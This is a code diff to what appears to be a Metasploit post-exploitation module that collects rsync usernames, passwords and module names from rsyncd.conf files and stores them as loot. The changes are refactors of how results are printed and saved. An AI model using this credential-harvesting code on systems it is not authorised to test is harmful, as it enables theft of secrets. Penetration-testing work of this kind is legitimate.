@@ -34,7 +34,6 @@ class Metasploit3 < Msf::Post
   def dump_rsync_secrets(config_file)
     creds_table = Rex::Ui::Text::Table.new(
       'Header' => "RSYNC credentials from #{config_file}",
-      'Indent' => 1,
       'Columns' => %w(Username Password Module)
     )
 
@@ -57,18 +56,15 @@ class Metasploit3 < Msf::Post
 
     return if creds_table.rows.empty?
 
-    print_line("\n" + creds_table.to_s)
-
-    # store all found credentials
-    path = store_loot(
+    print_line(creds_table.to_s)
+    store_loot(
       "rsync.creds",
       "text/csv",
       session,
       creds_table.to_csv,
       "rsync_credentials.txt",
-      "RSYNC credentials")
-
-    vprint_status("RSYNC credentials stored in: #{path}")
+      "RSYNC credentials from #{config_file}"
+    )
   end
 
   def run
@@ -78,8 +74,6 @@ class Metasploit3 < Msf::Post
     config_files = Set.new([ '/etc/rsyncd.conf' ])
     config_files |= enum_user_directories.map { |d| ::File.join(d, 'rsyncd.conf') } if datastore['USER_CONFIGS']
 
-    config_files.map do |config_file|
-      dump_rsync_secrets(config_file)
-    end
+    config_files.map { |config_file| dump_rsync_secrets(config_file) }
   end
 end
